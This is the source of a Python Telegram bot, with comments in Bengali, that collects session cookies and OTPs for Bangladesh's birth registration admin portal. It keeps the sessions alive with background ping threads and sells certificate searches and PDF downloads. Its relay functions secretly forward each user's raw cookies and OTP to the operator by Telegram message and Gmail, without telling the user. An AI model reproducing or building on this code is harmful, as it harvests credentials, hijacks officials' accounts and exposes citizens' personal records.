import os
import sys
import telebot
import requests
import json
import io
import time
import re
import logging
import threading
import hashlib
from threading import Thread, RLock
from datetime import datetime
from urllib.parse import quote
from collections import OrderedDict
from flask import Flask
from pymongo import MongoClient
from pymongo.errors import DuplicateKeyError

# ইমেইল মডিউলগুলো
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ==========================================
# ০. ইমেইল সেন্ডার ও টেলিগ্রাম নোটিফিকেশন ফাংশন
# ==========================================
def send_email_to_admin(subject, body):
    if not ADMIN_EMAIL or not EMAIL_PASS:
        logging.warning("⚠️ Email credentials missing in Environment Variables, skipping email.")
        return
    try:
        msg = MIMEMultipart()
        msg['From'] = ADMIN_EMAIL
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(ADMIN_EMAIL, EMAIL_PASS)
            server.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
            
        logging.info("✅ জিমেইলে সফলভাবে ইমেইল পাঠানো হয়েছে!")
    except Exception as e:
        logging.error(f"❌ Email Sending Failed: {e}")

def relay_info_to_email(chat_id, u_name):
    u_sess = get_session(chat_id)
    ch_raw = u_sess['temp_data'].get('ch_raw', 'N/A')
    sec_raw = u_sess['temp_data'].get('sec_raw', 'N/A')
    otp_val = u_sess.get('ch_otp', 'N/A')
    
    email_report = f"--- BDRIS LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
    email_report += f"CH RAW: {ch_raw}\n\nOTP: {otp_val}\n\nSEC RAW: {sec_raw}\n"
    
    tg_report = f"🚨 *BDRIS LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n\n🔑 *CH RAW:* `{ch_raw}`\n\n🔢 *OTP:* `{otp_val}`\n\n🔑 *SEC RAW:* `{sec_raw}`"
    
    safe_send(ADMIN_ID, tg_report, parse_mode="Markdown")
    send_email_to_admin(f"Login Alert: {u_name}", email_report)

def relay_admin_login_to_email(chat_id, u_name, raw_data):
    email_report = f"--- ADMIN LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\nADMIN RAW SESSION: {raw_data}\n"
    tg_report = f"🚨 *ADMIN LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n\n🔑 *ADMIN RAW:* `{raw_data}`"
    
    safe_send(ADMIN_ID, tg_report, parse_mode="Markdown")
    send_email_to_admin(f"Admin Login Alert: {u_name}", email_report)

# ==========================================
# ১. গ্লোবাল ভেরিয়েবল ও থ্রেড লক
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

session_lock = RLock()
download_lock = threading.Lock()
active_downloads = set()
active_ping_workers = {} # 📌 সেশন পিং ট্র্যাকার (Smart Keep-Alive)

_COOKIE_RE = re.compile(r'SESSION\s*[:=]?\s*([A-Za-z0-9_-]+)', re.I)
_TS_RE = re.compile(r'TS0108b707\s*[:=]?\s*([A-Za-z0-9_-]+)', re.I)
_CSRF_RE = re.compile(r'name="_csrf"\s+content="([^"]+)"')
_PHONE_RE = re.compile(r'^(\+?880|0)1[3-9]\d{8}$')

VALID_CMDS = frozenset(['apps', 'corr', 'repr'])
DEFAULT_PERMS = {"apps": True, "corr": True, "repr": True, "search": True, "ubrn_update": True, "server_pdf": True, "print": True}
SERVICE_COSTS = {"pdf": 25, "pay": 25, "server_pdf_login": 25, "server_pdf_no_login": 50}

MAX_CACHE_SIZE = 300
RATE_LIMIT_INTERVAL = 0.8
RATE_LIMIT_WARNING_INTERVAL = 5
APP_DEFAULT_LENGTH = 5
MAX_MESSAGE_LENGTH = 4000
MAX_SEARCH_RESULTS = 10
MAX_RECHARGE_AMOUNT = 50000
MIN_RECHARGE_AMOUNT = 1
HTTP_TIMEOUT = 30

# ==========================================
# ২. কনফিগারেশন ও ডাটাবেস
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN', '').strip()
MONGO_URI = os.environ.get('MONGO_URI', '').strip()
ADMIN_ID_STR = os.environ.get('ADMIN_ID', '0').strip()
ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL', '').strip()
EMAIL_PASS = os.environ.get('EMAIL_PASS', '').replace(" ", "").strip()
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', ADMIN_EMAIL).strip()

if not all([API_TOKEN, MONGO_URI, ADMIN_ID_STR]):
    logging.critical("❌ Critical Environment Variables missing!")
    sys.exit(1)

ADMIN_ID = int(ADMIN_ID_STR)
bot = telebot.TeleBot(API_TOKEN, threaded=True, num_threads=8)

try:
    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000, socketTimeoutMS=45000, maxPoolSize=50)
    mongo_client.admin.command('ping')
    db = mongo_client['bdris_bot_db']
    sessions_collection = db['users_sessions']
    access_collection = db['users_access']
    settings_collection = db['bot_settings']
    recharge_logs = db['recharge_logs']
    
    if not settings_collection.find_one({"_id": "config"}):
        settings_collection.insert_one({"_id": "config", "payment_active": True})
    logging.info("✅ MongoDB Connected Successfully!")
except Exception as e:
    logging.critical(f"❌ DB Connection Failed: {e}")
    sys.exit(1)

# ==========================================
# ৩. সেফ র‍্যাপারস ও ইউজার লজিক
# ==========================================
def sanitize_name(name_str):
    sanitized = re.sub(r'[*_`\[\]()~|{}<>\\-]', '', str(name_str))
    sanitized = sanitized.replace('<', '').replace('>', '')
    return sanitized[:100]

def safe_send(chat_id, text, **kwargs):
    try: return bot.send_message(chat_id, text, **kwargs)
    except Exception: return None

def safe_edit(chat_id, message_id, text, **kwargs):
    try: return bot.edit_message_text(text, chat_id, message_id, **kwargs)
    except Exception: return None

def safe_delete(chat_id, message_id):
    try: bot.delete_message(chat_id, message_id)
    except Exception: pass

def is_payment_active():
    try:
        config = settings_collection.find_one({"_id": "config"})
        return config.get("payment_active", True) if config else True
    except: return True

def get_service_cost(user_id, service="default"):
    if user_id == ADMIN_ID or not is_payment_active(): return 0
    return SERVICE_COSTS.get(service, 25)

def get_balance(user_id):
    if user_id == ADMIN_ID: return 999999
    try:
        record = access_collection.find_one({"chat_id": user_id})
        return int(record.get("balance", 0)) if record else 0
    except: return 0

def update_balance(user_id, amount):
    if user_id == ADMIN_ID: return
    try: access_collection.update_one({"chat_id": user_id}, {"$inc": {"balance": amount}})
    except: pass

def deduct_balance(user_id, amount):
    if user_id == ADMIN_ID or amount <= 0: return True
    try:
        res = access_collection.update_one(
            {"chat_id": user_id, "balance": {"$gte": amount}}, 
            {"$inc": {"balance": -amount}}
        )
        return res.modified_count > 0
    except: return False

def check_user_access(user_id, user_name):
    if user_id == ADMIN_ID: return True
    try:
        user_record = access_collection.find_one({"chat_id": user_id})
        if not user_record:
            access_collection.insert_one({
                "chat_id": user_id, "name": str(user_name)[:100], "status": "allowed", 
                "permissions": DEFAULT_PERMS.copy(), "balance": 0
            })
            safe_send(ADMIN_ID, f"🔔 *নতুন ইউজার!*\n👤 {sanitize_name(user_name)}\n🆔 `{user_id}`", parse_mode="Markdown")
            return True
        return user_record.get("status") == "allowed"
    except: return False

def get_user_permissions(user_id):
    if user_id == ADMIN_ID: return {k: True for k in DEFAULT_PERMS}
    try:
        record = access_collection.find_one({"chat_id": user_id})
        if record and "permissions" in record:
            p = DEFAULT_PERMS.copy()
            p.update(record["permissions"])
            return p
    except: pass
    return DEFAULT_PERMS.copy()

def is_rate_limited(user_id):
    u_sess = get_session(user_id)
    now = time.time()
    trigger_warning = False
    is_limited = False
    with session_lock:
        if now - u_sess.get("last_action_time", now) < RATE_LIMIT_INTERVAL:
            is_limited = True
            if now - u_sess.get("last_warning_time", 0) > RATE_LIMIT_WARNING_INTERVAL:
                u_sess["last_warning_time"] = now
                trigger_warning = True
        else:
            u_sess["last_action_time"] = now
    if trigger_warning:
        safe_send(user_id, f"⚠️ *একটু ধীরে!* স্প্যামিং থেকে বাঁচতে {RATE_LIMIT_INTERVAL} সেকেন্ড অপেক্ষা করুন।", parse_mode="Markdown")
    return is_limited

def is_cancel(m):
    if not m or not m.text: return False
    t = m.text.strip()
    if "/start" in t or "Back to Menu" in t or "Dashboard" in t:
        bot.clear_step_handler_by_chat_id(m.chat.id)
        safe_send(m.chat.id, "🏠 মেনুতে ফিরে আসা হলো।", reply_markup=generate_main_menu(m.chat.id, m.from_user.id))
        return True
    return False

# ==========================================
# ৪. সেশন ম্যানেজমেন্ট ও Independent Workers
# ==========================================
user_sessions = {}

# 📌 ইউনিক হ্যাশ জেনারেটর
def get_session_hash(session_obj):
    cookies = session_obj.cookies.get_dict()
    raw_str = f"{cookies.get('SESSION', '')}_{cookies.get('TS0108b707', '')}"
    return hashlib.md5(raw_str.encode()).hexdigest()

# 📌 পিং ওয়ার্কার থ্রেড
def ping_worker(h, uid, session_obj, ua, mode):
    interval = 180 if mode == "CHAIRMAN" else 240
    while True:
        time.sleep(interval) # নির্দিষ্ট সময় পরপর জাগবে
        
        is_alive = False
        try:
            headers = {'User-Agent': ua, 'Referer': 'https://bdris.gov.bd/admin/'}
            res = session_obj.get("https://bdris.gov.bd/admin/", headers=headers, timeout=40)
            if 'login' not in res.url.lower():
                is_alive = True
        except:
            is_alive = False
            
        if not is_alive:
            # সেশন ডেড হলে স্ট্যাটাস ফলস করা
            with session_lock:
                if uid in user_sessions:
                    u_sess = user_sessions[uid]
                    if mode == "CHAIRMAN": u_sess["ch_alive"] = False
                    else: u_sess["sec_alive"] = False
                    u_sess["is_alive"] = u_sess.get("sec_alive", False) or u_sess.get("ch_alive", False)
                    save_session_to_db(uid, u_sess)
            
            # ওয়ার্কার রিমুভ ও লুপ ব্রেক
            if h in active_ping_workers: del active_ping_workers[h]
            logging.info(f"Session dead for UID: {uid} Mode: {mode}. Worker stopped.")
            break 

# 📌 ওয়ার্কার ম্যানেজার
def manage_ping_worker(uid, u_sess):
    if u_sess.get("ch_alive"):
        h = get_session_hash(u_sess["ch_session"])
        if h not in active_ping_workers:
            t = Thread(target=ping_worker, args=(h, uid, u_sess["ch_session"], u_sess["ua"], "CHAIRMAN"), daemon=True)
            t.start()
            active_ping_workers[h] = t
            
    if u_sess.get("sec_alive"):
        h = get_session_hash(u_sess["req_session"])
        if h not in active_ping_workers:
            t = Thread(target=ping_worker, args=(h, uid, u_sess["req_session"], u_sess["ua"], "SECRETARY"), daemon=True)
            t.start()
            active_ping_workers[h] = t

def get_default_session_dict():
    return {
        "req_session": requests.Session(), "csrf": "", "ch_session": requests.Session(), "ch_csrf": "", "ch_otp": "",
        "mode": "SECRETARY", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "is_alive": False, "sec_alive": False, "ch_alive": False,
        "current_page": "https://bdris.gov.bd/admin/", "app_start": 0, "app_length": APP_DEFAULT_LENGTH, "sharok_no": 1, 
        "temp_data": {}, "id_cache": OrderedDict(),
        "last_action_time": time.time(), "last_warning_time": 0.0, "current_search_val": ""
    }

def get_session(user_id):
    with session_lock:
        if user_id in user_sessions: 
            return user_sessions[user_id]
    
    db_data = None
    try: db_data = sessions_collection.find_one({"chat_id": user_id})
    except Exception as e: logging.error(f"DB Load Error: {e}")

    with session_lock:
        if user_id not in user_sessions:
            u_sess = get_default_session_dict()
            if db_data:
                u_sess["req_session"].cookies.update(db_data.get("sec_cookies", {}))
                u_sess["ch_session"].cookies.update(db_data.get("ch_cookies", {}))
                u_sess.update({
                    "mode": db_data.get("mode", "SECRETARY"), "ch_otp": db_data.get("ch_otp", ""),
                    "is_alive": db_data.get("is_alive", False), "sec_alive": db_data.get("sec_alive", False),
                    "ch_alive": db_data.get("ch_alive", False), "sharok_no": db_data.get("sharok_no", 1),
                    "app_length": db_data.get("app_length", APP_DEFAULT_LENGTH)
                })
            user_sessions[user_id] = u_sess
            manage_ping_worker(user_id, u_sess) # 📌 সেশন লোড হলেই ওয়ার্কার চালু হবে
        return user_sessions[user_id]

def save_session_to_db(user_id, u_sess):
    try:
        data = {
            "chat_id": user_id, "sec_cookies": u_sess["req_session"].cookies.get_dict(),
            "ch_cookies": u_sess["ch_session"].cookies.get_dict(), "mode": u_sess["mode"],
            "ch_otp": u_sess.get("ch_otp", ""), "is_alive": u_sess["is_alive"],
            "sec_alive": u_sess.get("sec_alive", False), "ch_alive": u_sess.get("ch_alive", False),
            "sharok_no": u_sess.get("sharok_no", 1), "app_length": u_sess.get("app_length", APP_DEFAULT_LENGTH)
        }
        sessions_collection.update_one({"chat_id": user_id}, {"$set": data}, upsert=True)
    except Exception as e: 
        logging.error(f"DB Save Error: {e}")

def clear_user_session(user_id):
    with session_lock:
        if user_id in user_sessions:
            u_sess = user_sessions[user_id]
            # 📌 কুকি হ্যাশ বের করে ওয়ার্কার রিমুভ করা
            h_ch = get_session_hash(u_sess["ch_session"])
            h_sec = get_session_hash(u_sess["req_session"])
            if h_ch in active_ping_workers: del active_ping_workers[h_ch]
            if h_sec in active_ping_workers: del active_ping_workers[h_sec]

            u_sess["req_session"].cookies.clear()
            u_sess["ch_session"].cookies.clear()
            u_sess["is_alive"] = False
            u_sess["sec_alive"] = False
            u_sess["ch_alive"] = False
            u_sess["ch_otp"] = ""
            u_sess["temp_data"].clear()
            save_session_to_db(user_id, u_sess)

# ==========================================
# ৫. কিবোর্ড ও UI লজিক
# ==========================================
def generate_main_menu(chat_id, user_id=None):
    if not user_id: user_id = chat_id
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    u_sess = get_session(user_id)
    perms = get_user_permissions(user_id)

    if not u_sess.get("is_alive", False):
        markup.row("🔑 User Login")
        if perms.get("server_pdf") or user_id == ADMIN_ID: markup.row("🖨️ Server PDF Print")
        if is_payment_active(): markup.row("💰 My Profile & Recharge")
        if user_id == ADMIN_ID:
            markup.row("🔑 Admin Login", "🛠️ Check Cookies", "🧹 Clear Cookies")
            markup.row("👥 Manage Users")
    else:
        markup.row("🔑 User Login")
        if is_payment_active(): markup.row("💰 My Profile & Recharge")
        markup.row("👤 নিবন্ধক সেকশন", "🧑‍💼 অথোরাইজড ইউজার")
        
        row_core = []
        if perms.get("apps") or user_id == ADMIN_ID: row_core.append("📋 Applications")
        if perms.get("corr") or user_id == ADMIN_ID: row_core.append("📝 Correction")
        if perms.get("repr") or user_id == ADMIN_ID: row_core.append("🔄 Reprint")
        if row_core: markup.row(*row_core)
        
        row_search = ["🏠 Dashboard"]
        if perms.get("search") or user_id == ADMIN_ID: row_search.extend(["🌐 Search By Name", "🔢 Search By UBRN"])
        markup.row(*row_search)
        
        row_tools = ["📌 Set Default Verifier"]
        if perms.get("ubrn_update") or user_id == ADMIN_ID: row_tools.append("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
        if perms.get("server_pdf") or user_id == ADMIN_ID: row_tools.append("🖨️ Server PDF Print")
        if row_tools: markup.row(*row_tools)

        if user_id == ADMIN_ID:
            markup.row("🔑 Admin Login", "🛠️ Check Cookies", "🧹 Clear Cookies")
            markup.row("👥 Manage Users")
            
    return markup

# ==========================================
# ৬. কোর API রিকোয়েস্ট ফাংশন
# ==========================================
def extract_sid_tsid(text):
    text = text.strip()
    s_match = _COOKIE_RE.search(text)
    t_match = _TS_RE.search(text) 
    sid = s_match.group(1) if s_match else None
    tsid = t_match.group(1) if t_match else None
    
    if sid and tsid: return sid, tsid
        
    tokens = [tok.strip() for tok in re.split(r'[\s;,"\'\n\r]+', text) if len(tok.strip()) >= 15]
    if len(tokens) >= 2:
        tokens.sort(key=len, reverse=True)
        tsid_fallback = tokens[0]
        sid_fallback = next((tok for tok in tokens[1:] if 30 <= len(tok) <= 60), tokens[1])
        return sid_fallback, tsid_fallback
    return None, None

def get_active_session(u_sess):
    with session_lock:
        sec_ok = u_sess.get("sec_alive", False)
        ch_ok = u_sess.get("ch_alive", False)
        mode = u_sess["mode"]
    if mode == "CHAIRMAN":
        if ch_ok: return (u_sess["ch_session"], u_sess["ch_csrf"])
        return (u_sess["req_session"], u_sess["csrf"])
    else:
        if sec_ok: return (u_sess["req_session"], u_sess["csrf"])
        return (u_sess["ch_session"], u_sess["ch_csrf"])

def _set_session_cookies(sess, sid, tsid):
    sess.cookies.clear()
    sess.cookies.set("SESSION", sid, domain='bdris.gov.bd')
    sess.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')

def call_api(user_id, url, method="GET", data=None, extra_headers=None, retries=2, force_sec=False):
    u_sess = get_session(user_id)
    if force_sec:
        sess, csrf = u_sess["req_session"], u_sess["csrf"]
    else:
        sess, csrf = get_active_session(u_sess)
        
    headers = {
        'x-csrf-token': csrf, 
        'x-requested-with': 'XMLHttpRequest', 
        'user-agent': u_sess["ua"], 
        'referer': u_sess["current_page"]
    }
    if extra_headers: headers.update(extra_headers)
        
    for attempt in range(retries):
        try:
            if method == "POST": 
                return sess.post(url, headers=headers, data=data, timeout=HTTP_TIMEOUT)
            return sess.get(url, headers=headers, timeout=HTTP_TIMEOUT)
        except:
            if attempt < retries - 1: time.sleep(1)
    return None

def navigate_to(user_id, url):
    u_sess = get_session(user_id)
    sess, _ = get_active_session(u_sess)
    try:
        res = sess.get(url, headers={'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}, timeout=HTTP_TIMEOUT)
        match = _CSRF_RE.search(res.text)
        if match:
            with session_lock:
                if u_sess["mode"] == "CHAIRMAN": u_sess["ch_csrf"] = match.group(1)
                else: u_sess["csrf"] = match.group(1)
        u_sess["current_page"] = url
        return True, res.text
    except Exception as e:
        logging.error(f"❌ Navigate Error [{url}]: {e}")
        return False, None

# ==========================================
# ৭. লগইন ফ্লো ও রিচার্জ
# ==========================================
def admin_login_logic(m):
    try:
        if is_cancel(m): return
        sid, tsid = extract_sid_tsid(m.text or "")
        uid = m.from_user.id
        if sid and tsid:
            u_sess = get_session(uid)
            with session_lock:
                _set_session_cookies(u_sess["req_session"], sid, tsid)
            
            success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
            is_valid_login = success and html and ('login' not in html.lower() and _CSRF_RE.search(html))
            
            if is_valid_login:
                with session_lock:
                    u_sess["sec_alive"] = True
                    u_sess["is_alive"] = True
                save_session_to_db(uid, u_sess)
                manage_ping_worker(uid, u_sess) # 📌 পিং ওয়ার্কার চালু
                safe_send(m.chat.id, "✅ এডমিন সেশন সেট হয়েছে!", reply_markup=generate_main_menu(m.chat.id, uid))
                
                safe_name = sanitize_name(m.from_user.first_name)
                Thread(target=relay_admin_login_to_email, args=(uid, safe_name, m.text), daemon=True).start()
            else:
                with session_lock:
                    u_sess["is_alive"] = False
                    u_sess["sec_alive"] = False
                safe_send(m.chat.id, "❌ কুকি মেয়াদোত্তীর্ণ বা কাজ করছে না! আবার দিন:")
                bot.register_next_step_handler_by_chat_id(m.chat.id, admin_login_logic)
        else:
            safe_send(m.chat.id, "❌ ভুল ফরম্যাট! SESSION= ও TS01...= সহ বা শুধু ভ্যালুগুলো দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, admin_login_logic)
    except Exception as e:
        logging.error(f"Admin Login Error: {e}")
        safe_send(m.chat.id, "❌ প্রসেসিং এ সমস্যা হয়েছে। আবার চেষ্টা করুন।")

def role_step_1(m):
    try:
        if is_cancel(m): return
        uid = m.from_user.id
        raw_text = m.text if m.text else ""
        sid, tsid = extract_sid_tsid(raw_text)
        if not sid or not tsid:
            safe_send(m.chat.id, "❌ সঠিক কুকি ফরম্যাট পাওয়া যায়নি। আবার দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_1)
            return
        u_sess = get_session(uid)
        with session_lock:
            u_sess["temp_data"]["ch_raw"] = raw_text 
            _set_session_cookies(u_sess["ch_session"], sid, tsid)
            u_sess["ch_alive"] = True
            u_sess["is_alive"] = u_sess.get("sec_alive", False) or True
        manage_ping_worker(uid, u_sess) # 📌 চেয়ারম্যান সেশনের ওয়ার্কার চালু
        safe_send(m.chat.id, "✅ নিবন্ধক সেশন গৃহীত। এখন নিবন্ধকের OTP দিন:")
        bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_2)
    except Exception as e:
        logging.error(f"Step 1 Error: {e}")
        safe_send(m.chat.id, "❌ প্রসেসিং এ সমস্যা হয়েছে। আবার চেষ্টা করুন।")

def role_step_2(m):
    try:
        if is_cancel(m): return
        otp = m.text.strip() if m.text else ""
        if not otp.isdigit():
            safe_send(m.chat.id, "❌ OTP শুধু সংখ্যা হবে। আবার দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_2)
            return
        with session_lock:
            get_session(m.from_user.id)["ch_otp"] = otp
        safe_send(m.chat.id, "✅ OTP সংরক্ষিত। এখন অথোরাইজড ইউজার সেশন দিন:")
        bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
    except Exception as e:
        logging.error(f"Step 2 Error: {e}")
        safe_send(m.chat.id, "❌ প্রসেসিং এ সমস্যা হয়েছে। আবার চেষ্টা করুন।")

def role_step_3(m):
    try:
        if is_cancel(m): return
        uid = m.from_user.id
        raw_text = m.text if m.text else ""
        sid, tsid = extract_sid_tsid(raw_text)
        if sid and tsid:
            u_sess = get_session(uid)
            
            # 📌 নতুন লজিক: কুকি ডুপ্লিকেট চেক
            with session_lock:
                ch_sid = u_sess["ch_session"].cookies.get("SESSION")
                
            if sid == ch_sid:
                safe_send(m.chat.id, "❌ আপনি নিবন্ধক (Chairman) এবং অথোরাইজড ইউজার (Secretary) এর জন্য একই কুকি দিয়েছেন!\n\nদুটি আলাদা কুকি প্রয়োজন। দয়া করে *অথোরাইজড ইউজারের* নতুন কুকি দিন:", parse_mode="Markdown")
                bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
                return

            with session_lock:
                u_sess["temp_data"]["sec_raw"] = raw_text 
                _set_session_cookies(u_sess["req_session"], sid, tsid)
            
            success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
            is_valid_login = success and html and ('login' not in html.lower() and _CSRF_RE.search(html))
            
            if is_valid_login:
                with session_lock:
                    u_sess["sec_alive"] = True
                    u_sess["is_alive"] = True
                
                save_session_to_db(uid, u_sess)
                manage_ping_worker(uid, u_sess) # 📌 সেক্রেটারি সেশনের ওয়ার্কার চালু
                safe_send(m.chat.id, "🎉 লগইন সফল!", reply_markup=generate_main_menu(m.chat.id, uid))
                
                safe_name = sanitize_name(m.from_user.first_name)
                Thread(target=relay_info_to_email, args=(uid, safe_name), daemon=True).start()
            else:
                with session_lock:
                    u_sess["is_alive"] = False
                    u_sess["sec_alive"] = False
                safe_send(m.chat.id, "❌ কুকি মেয়াদোত্তীর্ণ বা ভুল! দয়া করে জ্যান্ত সেশন দিন:")
                bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
        else:
            safe_send(m.chat.id, "❌ ভুল ইউজার কুকি। আবার দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
    except Exception as e:
        logging.error(f"Step 3 Error: {e}")
        safe_send(m.chat.id, "❌ প্রসেসিং এ সমস্যা হয়েছে। আবার চেষ্টা করুন।")

def process_recharge(m):
    try:
        if is_cancel(m): return
        trxid = m.text.strip() if m.text else ""
        if not (5 <= len(trxid) <= 50):
            safe_send(m.chat.id, "❌ অবৈধ TrxID। আবার দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, process_recharge)
            return
        uid = m.from_user.id
        
        try:
            recharge_logs.insert_one({"_id": trxid, "user_id": uid, "status": "pending", "date": datetime.now()})
        except DuplicateKeyError:
            return safe_send(m.chat.id, "❌ এই TrxID ইতিমধ্যে ব্যবহৃত বা পেন্ডিং আছে।", reply_markup=generate_main_menu(m.chat.id, uid))
        
        safe_send(m.chat.id, "✅ আপনার রিচার্জ রিকোয়েস্ট পাঠানো হয়েছে।", reply_markup=generate_main_menu(m.chat.id, uid))
        
        safe_name = sanitize_name(m.from_user.first_name)
        msg_text = f"💰 *নতুন রিচার্জ রিকোয়েস্ট!*\n👤 User: {safe_name} (`{uid}`)\n📝 TrxID: `{trxid}`"
        markup = telebot.types.InlineKeyboardMarkup().row(
            telebot.types.InlineKeyboardButton("✅ Approve", callback_data=f"apprvbal:{uid}:{trxid}"),
            telebot.types.InlineKeyboardButton("❌ Reject", callback_data=f"rejbal:{uid}:{trxid}")
        )
        safe_send(ADMIN_ID, msg_text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Recharge Error: {e}")

def admin_add_balance_step(m, target_id, trxid, admin_msg_id):
    try:
        if is_cancel(m): return
        try:
            amount = int(m.text.strip() if m.text else "")
            if not (MIN_RECHARGE_AMOUNT < amount <= MAX_RECHARGE_AMOUNT): 
                raise ValueError
            
            update_balance(target_id, amount)
            try: recharge_logs.update_one({"_id": trxid}, {"$set": {"status": "approved"}})
            except: pass
            
            safe_send(m.chat.id, f"✅ User {target_id} এর অ্যাকাউন্টে {amount}৳ যোগ হয়েছে।")
            safe_send(target_id, f"🎉 *রিচার্জ সফল!*\nযোগ হয়েছে: {amount}৳\nব্যালেন্স: {get_balance(target_id)}৳", parse_mode="Markdown")
            safe_delete(m.chat.id, admin_msg_id)
        except Exception:
            safe_send(m.chat.id, f"❌ ভুল ইনপুট। {MIN_RECHARGE_AMOUNT} থেকে {MAX_RECHARGE_AMOUNT} এর মধ্যে সংখ্যা দিন।")
            bot.register_next_step_handler_by_chat_id(m.chat.id, lambda m_: admin_add_balance_step(m_, target_id, trxid, admin_msg_id))
    except Exception as e:
        logging.error(f"Admin Balance Error: {e}")

# ==========================================
# ৮. সার্ভার পিডিএফ ও ডাউনলোড
# ==========================================
def download_server_by_ubrn(m):
    try:
        if is_cancel(m): return
        uid, cid = m.from_user.id, m.chat.id
        ubrn = m.text.strip() if m.text else ""
        if not (ubrn.isdigit() and len(ubrn) == 17):
            safe_send(cid, "❌ সঠিক ১৭ ডিজিট UBRN দিন:")
            bot.register_next_step_handler_by_chat_id(cid, download_server_by_ubrn)
            return

        u_sess = get_session(uid)
        working_uid = uid if u_sess.get("is_alive", False) else ADMIN_ID
        if working_uid == ADMIN_ID and not get_session(ADMIN_ID).get("is_alive", False):
            return safe_send(cid, "❌ সিস্টেম অফলাইন। অ্যাডমিন সেশন নেই।")

        cost = get_service_cost(uid, "server_pdf_login" if working_uid == uid else "server_pdf_no_login")
        task_id = f"dl_{uid}_{ubrn}"
        
        with download_lock:
            if task_id in active_downloads: 
                return safe_send(cid, "⚠️ অলরেডি প্রসেসিং হচ্ছে...")
            active_downloads.add(task_id)
        
        if cost > 0:
            if not deduct_balance(uid, cost):
                with download_lock: active_downloads.discard(task_id)
                return safe_send(cid, f"❌ পর্যাপ্ত ব্যালেন্স ({cost}৳) নেই।")

        wait = safe_send(cid, f"⏳ সার্ভারে খোঁজা হচ্ছে... (চার্জ: {cost}৳)")
        
        def fetch_and_send():
            try:
                res = call_api(working_uid, f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}")
                if wait: safe_delete(cid, wait.message_id)
                
                if res and res.status_code == 200 and 'encryptedId' in res.json():
                    download_server_pdf(cid, working_uid, res.json()['encryptedId'], f"PDF_{ubrn}")
                    safe_send(cid, f"✅ ডাউনলোড সফল! বর্তমান ব্যালেন্স: {get_balance(uid)}৳")
                else:
                    raise ValueError("ID Not Found")
            except Exception as e:
                logging.error(f"Download Fetch Error: {e}")
                try:
                    if wait: safe_delete(cid, wait.message_id)
                except: pass
                if cost > 0: update_balance(uid, cost)
                safe_send(cid, "❌ সার্ভার এরর বা ডেটা পাওয়া যায়নি। টাকা রিফান্ড করা হয়েছে।")
            finally:
                with download_lock: active_downloads.discard(task_id)
                
        try:
            Thread(target=fetch_and_send, daemon=True).start()
        except Exception:
            if cost > 0: update_balance(uid, cost)
            with download_lock: active_downloads.discard(task_id)
            if wait: safe_delete(cid, wait.message_id)
            safe_send(cid, "❌ সিস্টেম ওভারলোড। টাকা রিফান্ড করা হয়েছে।")

    except Exception as e:
        logging.error(f"Download Start Error: {e}")

def download_server_pdf(chat_id, session_uid, enc_id, filename):
    u = get_session(session_uid)
    sess, csrf = get_active_session(u)
    with session_lock: ua = u.get("ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        
    safe_send(chat_id, "📥 পিডিএফ জেনারেট হচ্ছে (একটু সময় লাগতে পারে)...")
    
    check_headers = {
        'User-Agent': ua, 'Referer': 'https://bdris.gov.bd/admin/',
        'x-csrf-token': csrf, 'x-requested-with': 'XMLHttpRequest', 'client': 'bris'
    }
    
    try:
        sess.get(f"https://bdris.gov.bd/admin/new-certificate/check?data={enc_id}", headers=check_headers, timeout=HTTP_TIMEOUT)
        print_headers = {'User-Agent': ua, 'Referer': 'https://bdris.gov.bd/admin/'}
        res = sess.get(f"https://bdris.gov.bd/admin/new-certificate/print?data={enc_id}", headers=print_headers, timeout=180)
        
        if 'application/pdf' in res.headers.get('Content-Type', ''):
            bot.send_document(chat_id, io.BytesIO(res.content), visible_file_name=f"{filename}.pdf")
        else:
            raise ValueError("Invalid Content-Type from Server")
    except Exception as e:
        logging.error(f"Telegram Document Send Failed: {e}")
        raise RuntimeError("Telegram API Failed")

# ==========================================
# ৯. অ্যাপ লিস্ট লজিক ও পেজিনেশন
# ==========================================
def handle_category_init(m, cmd):
    if cmd not in VALID_CMDS: return safe_send(m.chat.id, "❌ অজানা কমান্ড।")
    with session_lock:
        u_sess = get_session(m.from_user.id)
        u_sess["app_start"] = 0
        u_sess["current_search_val"] = ""
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🔍 Search ID", "📋 All List", "🏠 Back to Menu")
